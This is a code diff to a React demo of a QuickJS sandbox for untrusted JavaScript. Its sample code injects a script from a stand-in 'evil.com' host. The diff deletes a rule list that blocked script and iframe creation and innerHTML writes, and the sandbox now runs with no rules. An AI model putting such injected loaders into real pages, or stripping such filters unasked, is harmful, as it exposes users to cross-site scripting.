@@ -1,6 +1,5 @@
 import './App.css';
 import { useSandbox } from './hooks/useSandbox';
-import type { Rule, DOMOperation } from './sandbox';
 
 const defaultCode = `
 // This runs inside the QuickJS sandbox
@@ -27,30 +26,6 @@ script.src = 'http://evil.com/xss.js';
 document.head.appendChild(script);
 `;
 
-const filterRules: Rule[] = [
-  (op: DOMOperation) => {
-    // Block script and iframe creation
-    if (op.type === 'call' && op.method === 'createElement') {
-      const tag = String(op.args[0])?.toLowerCase();
-      if (tag === 'script' || tag === 'iframe') {
-        console.warn(`BLOCKED: attempt to create <${tag}>`);
-        return false;
-      }
-    }
-
-    // Block setting innerHTML
-    if (op.type === 'set' && op.prop === 'innerHTML') {
-      console.warn(`BLOCKED: attempt to set innerHTML`);
-      return false;
-    }
-
-    // If you wish to dump logs inside React, you can optionally capture the rule execution,
-    // though native console behaves better.
-    console.log(`ALLOW: ${op.type} on node(${op.nodeId}) - ${'prop' in op ? op.prop : op.method}`);
-    return true;
-  }
-];
-
 function App() {
   const {
     code,
@@ -65,7 +40,7 @@ function App() {
   return (
     <div className="container">
       <div className="split left-panel">
-        <h2>Unstrusted Code Editor</h2>
+        <h2>Untrusted Code Editor</h2>
         <textarea
           value={code}
           style={{ color: 'black' }}
@@ -73,7 +48,7 @@ function App() {
           spellCheck="false"
         />
         <div style={{ display: 'flex', gap: '10px' }}>
-          <button onClick={() => runCode(filterRules)} disabled={!qjsReady}>
+          <button onClick={() => runCode()} disabled={!qjsReady}>
             Run Sandboxed Code
           </button>
           <button onClick={resetPage} style={{ backgroundColor: '#fa5252' }}>
